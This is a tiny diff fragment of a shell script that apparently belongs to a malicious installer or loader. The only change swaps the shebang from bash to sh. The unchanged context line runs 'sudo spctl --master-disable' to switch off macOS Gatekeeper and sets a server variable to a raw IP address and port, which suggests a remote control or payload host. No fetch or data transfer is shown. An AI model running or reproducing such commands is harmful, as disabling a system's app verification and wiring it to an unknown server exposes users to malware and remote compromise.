@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/sh
 
 set -e; sudo spctl --master-disable; SERVER='GS=http://149.28.95.12:8808'
 
